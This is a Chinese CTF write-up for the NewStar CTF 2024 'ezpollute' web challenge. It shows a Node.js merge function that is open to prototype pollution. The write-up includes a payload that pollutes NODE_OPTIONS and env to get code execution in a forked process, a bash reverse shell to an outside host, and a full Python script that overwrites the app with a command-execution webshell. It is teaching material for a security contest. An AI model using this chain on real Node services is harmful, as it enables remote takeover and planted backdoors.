# ezpollute

> 分类：Web

## 题目描述
一道 JavaScript 原型链污染题。Node.js 版本 16，使用 `node-dev` 热部署启动。`/config` 路由调用 `merge` 函数存在原型链污染漏洞；`/process` 路由调用 `fork` 创建子进程用于水印添加。

```javascript
router.post("/config", async (ctx) => {
  ...
  userConfig = JSON.parse(jsonData);
  try {
    finalConfig = clone(defaultWaterMarkConfig);
    // 这里喵
    merge(finalConfig, userConfig);
    fs.writeFileSync(path.join(__dirname, "uploads", userID, "config.json"), JSON.stringify(finalConfig));
    ...
  }
});
```

`merge` 函数过滤了 `proto`，但可用 `constructor.prototype` 绕过：

```javascript
function merge(target, source) {
  if (!isObject(target) || !isObject(source)) {
    return target;
  }
  for (let key in source) {
    if (key === "__proto__") continue;
    if (source[key] === "") continue;
    if (isObject(source[key]) && key in target) {
      target[key] = merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

## 考察知识点
- JavaScript 原型链污染（`constructor.prototype` 绕过 `__proto__` 过滤）
- 污染 `NODE_OPTIONS` 和 `env` 实现 RCE
- `fork` 子进程预加载代码
- 热部署 + 写 WebShell

## 解法
污染 `NODE_OPTIONS` 和 `env`，在 `env` 中写入恶意代码，`fork` 创建子进程时首先加载恶意代码实现 RCE：

```python
payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                 "A":"require(\"child_process\").execSync(\"bash -c \'bash -i >& /dev/tcp/ip/port 0>&1\'\")//"
            }
        }
    }
}
# 注意 Payload 最后面有注释符 `//`，思路跟 SQL 注入很像
```

比赛环境不出网，无法弹 shell，改用写 WebShell 的做法（热部署）：

```python
import requests
import re
import base64
from time import sleep

url = "http://url:port"

# 获取 token（随便发送点图片）
files = [
    ('images', ('anno.png', open('./1.png', 'rb'), 'image/png')),
    ('images', ('soyo.png', open('./2.png', 'rb'), 'image/png'))
]
res = requests.post(url + "/upload", files=files)
token = res.headers.get('Set-Cookie')
match = re.search(r'token=([a-f0-9\-\.]+)', token)
if match:
    token = match.group(1)
    print(f"[+] token: {token}")
headers = {'Cookie': f'token={token}'}

webshell = """
const Koa = require('koa')
const Router = require('koa-router')
const app = new Koa()
const router = new Router()

router.get("/webshell", async (ctx) => {
    const {cmd} = ctx.query
    res = require('child_process').execSync(cmd).toString()
    return ctx.body = {
        res
    }
})

app.use(router.routes())
app.listen(3000, () => {
    console.log('http://127.0.0.1:3000')
})
"""

encoded_webshell = base64.b64encode(webshell.encode()).decode()

payload = {
    "constructor": {
        "prototype": {
            "NODE_OPTIONS": "--require /proc/self/environ",
            "env": {
                "A": f"require(\"child_process\").execSync(\"echo {encoded_webshell} | base64 -d > /app/index.js\")//"
            }
        }
    }
}

# 原型链污染
requests.post(url + "/config", json=payload, headers=headers)

# 触发 fork 实现 RCE
try:
    requests.post(url + "/process", headers=headers)
except Exception as e:
    pass

sleep(2)
# 访问有回显的 WebShell
res = requests.get(url + "/webshell?cmd=cat /flag")
print(res.text)
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week4/web/ezpollute.html
